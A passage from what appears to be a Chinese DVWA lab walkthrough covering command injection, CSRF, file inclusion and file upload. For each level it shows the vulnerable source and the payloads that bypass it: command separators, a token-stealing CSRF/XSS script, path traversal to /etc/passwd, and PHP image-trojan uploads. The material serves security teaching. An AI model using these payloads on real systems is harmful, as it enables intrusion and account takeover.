60);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        */</span><br><span class="line"></span><br><span class="line">        // Check to see if enough time has passed, if it hasn&#x27;t locked the account</span><br><span class="line">        if( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = true;</span><br><span class="line">            // print &quot;The account is locked&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Check the database (if username matches the password)</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( &#x27;:password&#x27;, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    // If its a valid login...</span><br><span class="line">    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;</span><br><span class="line">        // Get users details</span><br><span class="line">        $avatar       = $row[ &#x27;avatar&#x27; ];</span><br><span class="line">        $failed_login = $row[ &#x27;failed_login&#x27; ];</span><br><span class="line">        $last_login   = $row[ &#x27;last_login&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Had the account been locked out since last login?</span><br><span class="line">        if( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;&#123;$last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Reset bad login count</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Login failed</span><br><span class="line">        sleep( rand( 2, 4 ) );</span><br><span class="line"></span><br><span class="line">        // Give the user some feedback</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Update bad login count</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Set the last login time</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>用POST方法传入参数，比较安全</p>
<p>同样通过<code>checkToken</code>函数验证提交的表单中的<code>user_token</code>与会话中的<code>session_token</code>是否一致。这有助于防止跨站请求伪造攻击，代码在每次请求结束时通过<code>generateSessionToken</code>函数刷新CSRF令牌，以增强会话的安全性。</p>
<p>同样，用户名和密码通过<code>stripslashes</code>和<code>mysqli_real_escape_string</code>进行处理，以避免SQL注入攻击。</p>
<p>密码在存储前同样使用<code>md5</code>进行了散列处理。</p>

        <h6 id="关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟"   >
          <a href="#关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟" class="headerlink" title="关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟"></a>关键：通过跟踪用户失败的登录尝试次数来防止暴力破解攻击。如果失败次数超过3次，账户将被锁定15分钟</h6>
      <p>如果账户之前曾被锁定（即有暴力破解的迹象），用户将收到警告信息。</p>

        <h2 id="二、命令注入"   >
          <a href="#二、命令注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、命令注入" class="headerlink" title="二、命令注入"></a>二、命令注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201441479.png" alt="image-20240520144137454"></p>
<div class="table-container"><table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>A;B</td>
<td>A 不论正确与否都会执行 B 命令</td>
</tr>
<tr>
<td>A&amp;B</td>
<td>A 后台运行，A 和 B 同时执行</td>
</tr>
<tr>
<td>A&amp;&amp;B</td>
<td>A 执行成功时候才会执行 B 命令</td>
</tr>
<tr>
<td>A|B</td>
<td>A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</td>
</tr>
<tr>
<td>A||B</td>
<td>A 执行失败后才会执行 B 命令</td>
</tr>
</tbody></table></div>

        <h2 id="Low-1"   >
          <a href="#Low-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2>
      <p>即使不是IP地址也不会报错，可以输入一些简单的命令，比如</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;dir</span><br></pre></td></tr></table></div></figure>

<p>（加分号是让系统忽略之前的任何内容（如果有的话），并执行一个新的<code>dir</code>命令。）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201450526.png" alt="image-20240520145022497"></p>
<p>输入|ehco “ls”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201502820.png" alt="image-20240520150201793"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201450722.png" alt="image-20240520145047683"></p>
<p>对输入没有进行验证</p>
<p>而且使用<code>php_uname(&#39;s&#39;)</code>获取当前服务器的操作系统名称，如果返回的字符串包含”Windows NT”（即使用的是Windows系统，执行ping命令），所以在Windows系统下查看文件目录命令应该是dir</p>

        <h2 id="Medium-1"   >
          <a href="#Medium-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2>
      <p>此时输入;dir没有返回信息，但是输入|dir能正常输出，说明是把“;”过滤了</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201504764.png" alt="image-20240520150403738"></p>
<p>有设置黑名单，过滤了“&amp;&amp;”和“;”，用其他符号比如&amp;、|、||代替即可</p>

        <h2 id="High-1"   >
          <a href="#High-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-1" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201505236.png" alt="image-20240520150542198"></p>
<p>对输入进行了更多的过滤，但是仔细看能发现第三个是过滤了| ，在管道符后面不加空格就能绕过</p>

        <h2 id="Impossible-1"   >
          <a href="#Impossible-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>通过 <code>checkToken</code> 函数检查请求中的 CSRF 令牌与会话中的令牌是否匹配，以防止 CSRF 攻击。</p>
<p>获取用户输入的 IP 地址，并使用 <code>stripslashes</code> 函数去除可能的转义字符。</p>
<p>验证IP地址，被分割为四个部分（四个八位组），并检查每个部分是否为数字，并且确保只有四个八位组。</p>

        <h1 id="三、CSRF"   >
          <a href="#三、CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CSRF" class="headerlink" title="三、CSRF"></a>三、CSRF</h1>
      
        <h2 id="Low-2"   >
          <a href="#Low-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201519277.png" alt="image-20240520151939239"></p>
<p>只要登录之后，输入改后的密码两次就能改掉密码，密码修改后能看到URL已经改变为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></div></figure>

<p>因此只要让用户访问这个网址就可以把用户的密码成功修改</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201523319.png" alt="image-20240520152343277"></p>
<p>使用GET方法传参，很容易被篡改，而且只是验证了两个新密码是否一致</p>

        <h2 id="Medium-2"   >
          <a href="#Medium-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201526098.png" alt="image-20240520152601070"></p>
<p>多加了一个验证，检查 HTTP 请求的来源（Referer）是否包含当前服务器的域名，常用于确定请求是否来自同一个网站</p>
<p>假如把修改后的URL复制到另一个网页，会显示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201542994.png" alt="image-20240520154252963"></p>
<p>在Repeater中添加Referer字段</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201542105.png" alt="image-20240520154228070"></p>
<p>发送后密码成功修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201541804.png" alt="image-20240520154119768"></p>

        <h2 id="High-2"   >
          <a href="#High-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-2" class="headerlink" title="High"></a>High</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261023149.png" alt="image-20240526102255008"></p>
<p>使用 <code>checkToken</code> 函数验证 token，这样 CSRF 攻击的时候必须知道用户的 token 才可以成功，可以通过使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中，就可以完成修改密码的操作</p>
<p>可以去构造一个攻击脚本，脚本的作用就是获取用户token然后修改密码，将其放置在存储型XSS中，只要用户点击存储型XSS页面，就会完成CSRF攻击，即修改密码，下面是代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function attack()&#123;</span><br><span class="line">        document.getElementsByName(&#x27;user_token&#x27;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#x27;user_token&#x27;)[0].value;</span><br><span class="line">        document.getElementById(&quot;transfer&quot;).submit(); </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line">    &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></div></figure>

<p>利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token)</p>
<p>将这段脚本赋给txtName变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#x27;user_token&#x27;)[0].value)&gt;</span><br></pre></td></tr></table></div></figure>

<p>就可以获取到用户token</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261044928.png" alt="image-20240526104420862"></p>

        <h2 id="Impossible-2"   >
          <a href="#Impossible-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261111981.png" alt="image-20240526111144899"></p>
<p>对于 High 级别主要就是增加了输入当前密码的选项</p>

        <h1 id="四、文件包含"   >
          <a href="#四、文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、文件包含" class="headerlink" title="四、文件包含"></a>四、文件包含</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210853201.png" alt="image-20240521085315103"></p>
<p>三个文件，依次点进去</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210854330.png" alt="image-20240521085434286"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210854374.png" alt="image-20240521085451335"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210855753.png" alt="image-20240521085505715"></p>
<p>URL都会有相应改变</p>

        <h2 id="Low-3"   >
          <a href="#Low-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2>
      <p>先在文件上传漏洞处上传一个写有phpinfo()的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210913327.png" alt="image-20240521091302289"></p>
<p>再回到文件上传漏洞，将路径粘贴到参数page中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210914641.png" alt="image-20240521091440586"></p>
<p>文件成功执行</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210916324.png" alt="image-20240521091605288"></p>
<p>没有任何过滤</p>

        <h2 id="Medium-3"   >
          <a href="#Medium-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210918327.png" alt="image-20240521091815300"></p>
<p>过滤了字符串 <code>$file</code> 中的 <code>http://</code> , <code>https://</code>和路径中的 <code>../</code>（Unix/Linux 系统）和 <code>..\\</code>（Windows 系统）,如果有识别到这些字符则替换成空白字符</p>
<p>绕过方式：①双写②使用绝对路径</p>

        <h3 id="双写"   >
          <a href="#双写" class="heading-link"><i class="fas fa-link"></i></a><a href="#双写" class="headerlink" title="双写"></a>双写</h3>
      <p>在文件上传处上传phpinfo()文件（但是Medium难度下只能上传图片，所以把后缀改成jpg）</p>
<p>上传成功后构造payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=..././..././hackable/uploads/info.jpg</span><br></pre></td></tr></table></div></figure>

<p>实际识别到的还是</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../hackable/uploads/info.jpg</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210944172.png" alt="image-20240521094452130"></p>

        <h3 id="使用绝对路径"   >
          <a href="#使用绝对路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用绝对路径" class="headerlink" title="使用绝对路径"></a>使用绝对路径</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=/etc/passwd</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212139550.png" alt="image-20240521213902434"></p>

        <h2 id="High-3"   >
          <a href="#High-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-3" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211008555.png" alt="image-20240521100836525"></p>
<p><code>fnmatch(&quot;file*&quot;, $file)</code>：这个函数用于比较 <code>$file</code> 变量是否匹配模式 <code>&quot;file*&quot;</code>。这里的模式 <code>&quot;file*&quot;</code> 表示任何以 “file” 开头的字符串都应该匹配。如果 <code>$file</code> 符合这个模式，<code>fnmatch</code> 函数返回 <code>true</code>。此外，还检查 <code>$file</code> 是否不等于 <code>&quot;include.php&quot;</code>。</p>
<p>所以传入的参数中必须以file为开头</p>
<p>可以想到用file://伪协议</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file:///etc/passwd</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212139342.png" alt="image-20240521213956283"></p>

        <h2 id="Impossible-3"   >
          <a href="#Impossible-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231105935.png" alt="image-20240523110512896"></p>
<p>只允许包含include.php,file1.php,file2.php,file3.php的文件</p>

        <h1 id="五、文件上传"   >
          <a href="#五、文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、文件上传" class="headerlink" title="五、文件上传"></a>五、文件上传</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211015259.png" alt="image-20240521101511230"></p>

        <h2 id="Low-4"   >
          <a href="#Low-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2>
      <p>可以选择一个任意格式的文件上传，比如文件包含中Low难度的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211017425.png" alt="image-20240521101715390"></p>
<p>成功上传</p>
<p>复制路径访问<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/hackable/uploads/info.php" >http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/info.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>但实际访问的是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/hackable/uploads/info.php" >http://127.0.0.1:4280/hackable/uploads/info.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211021371.png" alt="image-20240521102100331"></p>
<p>表示上传成功</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211022578.png" alt="image-20240521102237537"></p>
<p>没什么限制</p>

        <h2 id="Medium-4"   >
          <a href="#Medium-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211023786.png" alt="image-20240521102321755"></p>
<p>限制了上传的文件必须是图片类型，并且小于100000</p>
<p>那就更改文件后缀为.jpg，上传并抓包，然后将文件后缀修改为.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211029661.png" alt="image-20240521102917633"></p>
<p>发送后可以看到文件成功上传</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211029463.png" alt="image-20240521102948439"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211031549.png" alt="image-20240521103119521"></p>

        <h2 id="High-4"   >
          <a href="#High-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-4" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211032344.png" alt="image-20240521103253304"></p>
<p>新增了使用<code>getimagesize()</code> 函数尝试获取图像的大小信息。如果文件是一个有效的图像，该函数会成功返回图像的尺寸信息；如果不是，返回 <code>false</code>。</p>
<p>需要制作一个图片马</p>
<p>方法：</p>
<p>将一个本来的图片文件用Notepad++打开，在后面添加一句话木马(phpinfo())</p>
<p>上传成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212153165.png" alt="image-20240521215335115"></p>
<p>用文件包含里的打开</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212152876.png" alt="image-20240521215252769"></p>

        <h2 id="Impossible-4"   >
          <a href="#Impossible-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211103883.png" alt="image-20240521110317819"></p>
<p>调用 <code>checkToken</code> 函数来验证 CSRF 令牌的有效性，防止跨站请求伪造攻击，并且末尾调用 <code>generateSessionToken()</code> 函数来生成新的 CSRF 令牌，准备下一次请求。</p>
<p>使用 <code>md5</code> 函数和 <code>uniqid</code> 函数生成基于上传文件名称的唯一文件名，以避免文件名冲突或敏感信息泄露。</p>
<p>使用<code>imagecreatefromjpeg</code> 和 <code>imagecreatefrompng</code>去除任何潜在的恶意元数据，代码对图像进行了重新编码。</p>
<p>如果存在临时文件，则使用 <code>unlink</code> 删除</p>

        <h1 id="六、不安全的验证码"   >
          <a href="#六、不安全的验证码" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、不安全的验证码" class="headerlink" title="六、不安全的验证码"></a>六、不安全的验证码</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241049477.png" alt="image-20240524104922436"></p>

        <h2 id="Low-5"   >
          <a href="#Low-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2>
      <p>查看关键源代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) &amp;&amp; ( $_POST[ &#x27;step&#x27; ] == &#x27;1&#x27; ) ) &#123;</span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = 